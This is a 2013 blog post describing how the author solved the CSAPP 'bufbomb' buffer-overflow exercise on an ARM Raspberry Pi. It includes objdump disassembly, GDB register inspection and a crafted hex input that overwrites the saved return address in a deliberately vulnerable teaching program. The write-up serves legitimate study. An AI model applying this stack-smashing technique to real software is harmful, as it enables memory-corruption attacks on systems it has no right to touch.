---
title: Bufferoverflow Experiment (CSAPP)
date: 2013-11-02 22:00
layout: post
category: projects
comments: true
tags: disassembly gdb bufferoverflow arm RPi c
description: "
Recently I have been reading a book from CMU named 'Computer Systems: A Programmer's Perspectie'. It's a very interesting book and makes quite good illustrations. It's not difficult to understand but I noticed an interesting experiment in Chapter 3 homework about stack buffer overflow injection. Although the book mainly talked about IA32, I completed it on ARM with my Raspberry Pi.
" 
---

Recently I have been reading a book from CMU named *Computer Systems: A Programmer's Perspectie*. It's a very interesting book and makes quite good illustrations. It's not difficult to understand but I noticed an interesting experiment in Chapter 3 homework about stack buffer overflow injection. Although the book mainly talked about IA32, I completed it on ARM with my Raspberry Pi.

*The question was a source file given in [bufbomb.c](http://csapp.cs.cmu.edu/public/1e/ics/code/asm/bufbomb.c). In the program procedure, test() calls getbuf() which calls getxs() and returns 1 constantly. Getxs() gets inputs from command line in hex format until meets an enter event. The requirement is to make getbuf() returns 0xdeadbeaf ( or other random hex strings actually ) instead of the constant 1.*

#####Use objdump to disassemble the binary file

In order to use GDB to learn about its register values and memory addresses. Use `-g` option to build the source file.

	gcc -g -o bufbomb bufbomb.c

Then 

	objdump -d bufbomb > disassemble.s

	00008590 <getbuf>:
	    8590:   e92d4800    push    {fp, lr}
	    8594:   e28db004    add fp, sp, #4
	    8598:   e24dd010    sub sp, sp, #16
		...	    
	    85a4:   ebffffa4    bl  843c <getxs>
	    85a8:   e3a03001    mov r3, #1
	    85ac:   e1a00003    mov r0, r3
	    85b0:   e24bd004    sub sp, fp, #4
	    85b4:   e8bd8800    pop {fp, pc}
	
	000085b8 <test>:
	    85b8:   e92d4800    push    {fp, lr} 
	    85bc:   e28db004    add fp, sp, #4
	    85c0:   e24dd008    sub sp, sp, #8
        ...
        85d0:   ebffffee    bl  8590 <getbuf>
	    85d4:   e50b0008    str r0, [fp, #-8]
	    85d8:   e59f3014    ldr r3, [pc, #20]   ; 85f4 <test+0x3c>
	    85dc:   e1a00003    mov r0, r3
	    85e0:   e51b1008    ldr r1, [fp, #-8]
	    85e4:   ebffff57    bl  8348 <_init+0x20>
        ...
        
lr in getbuf() would be storing `0x85d4` (this will also be verified in the GDB debugger) as its the next address to `bl getbuf`, when the callee returns, the return value would be put to `[fp, #-8]` and retrieved to r1 register. (See Step 3)

A stack-frame graph could be got from the disassembly codes. It should be noticed that in APCS (Arm Procedure Call Standard), r0 register is chosen to store the return value of functions. So It's not necessary to draw all of the several funtions as obviously the operation required would be in the connections in test() and getbuf(). 

[![stack-frame.jpg]({{BASE_PATH}}/images/csapp/stack-frame.jpg)]({{BASE_PATH}}/images/csapp/stack-frame.jpg)

<br />

#####Use GDB to get values of fp registers (lr registers can be got from either disassembly codes or GDB debugger)

Set breakpoints before each function call so that we can get the lr and fp values of the caller's function frame and pushed onto the callee's stack.

Starting program: /home/pi/workspace/test/bufbomb/bufbomb 

	Breakpoint 18, main () at bufbomb.c:63
	63	    *space = 0; 
	(gdb) print $fp
	$39 = (void *) 0xbefff5f4  
	(gdb) c
	Continuing.
	
	Breakpoint 4, test () at bufbomb.c:48
	48	    printf("Type Hex string:");
	(gdb) p $fp
	$40 = (void *) 0xbeffeff4  
	(gdb) p /x *(0xbeffeff4 - 0x4) 
	$42 = 0xbefff5f4
	(gdb) c
	Continuing.
	
	Breakpoint 3, getbuf () at bufbomb.c:41
	41	    getxs(buf);
	(gdb) p $fp
	$44 = (void *) 0xbeffefe4 
	(gdb) p /x *(0xbeffefe4) 
	$46 = 0x85d4 ; This is exactly the same from the dissembly code: 85d4:   e50b0008    str r0, [fp, #-8]

If a GDB debugger tool is not preferred, a printf() function will also be useful. But it will require an inline asm code in the c source file to get the register values. For example, put this code:

	int fp_value;
	__asm__ __volatile__("mov [result], fp\n": [result]"=r"(fp_value));
	printf("fp register value: 0x%.8x\n", fp_value);

in front of a function call process to get the caller's funtion pointer value. 

Now we can add the addresses and register values to the stack-frame graph above:

[![stack-frame2.jpg]({{BASE_PATH}}/images/csapp/stack-frame2.jpg)]({{BASE_PATH}}/images/csapp/stack-frame2.jpg)


<br />

#####Buffer overflow

The basic trick here is to modify the lr value on the stack of getbuf() to point to an address that by-pass the operation that sets r0, the return value of getbuf(), which is `1`, to `[fp - 0x4]` position of test() that is used to set r1 as the second parameter to `printf(format, ...)`. In order to change the lr value, we need to override it in a provided way. That is the **buffer overflow** we talking about here. `buf[12]` was defined and passed to getxs() with only the starter pointer without its length, which is unknow to the callee function. While there is no restriction of `*sp++`, it won't be long before the `*sp` reaches the fp pointer and modify its value.

[![stack-frame3.jpg]({{BASE_PATH}}/images/csapp/stack-frame3.jpg)]({{BASE_PATH}}/images/csapp/stack-frame3.jpg)

<br />

#####Result

Obviously, the input value could be:

	10 10 10 10 10 10 10 10 10 10 10 10 f4 ef ff be d8 85 00 00 00 00 00 00 af be ad de f4 f5 ff be 50 86 00

to get the result:

	(gdb) r
	Starting program: /home/pi/workspace/test/bufbomb/bufbomb 
	Type Hex string:10 10 10 10 10 10 10 10 10 10 10 10 f4 ef ff be d8 85 00 00 00 00 00 00 af be ad de f4 f5 ff be 50 86 00
	getbuf returned 0xdeadbeaf
	[Inferior 1 (process 2834) exited normally]

<br />

**Note: The process was done on the ARM platform, different platforms and compilers would require different input values as they might have different stack-frame structure and different addresses.**
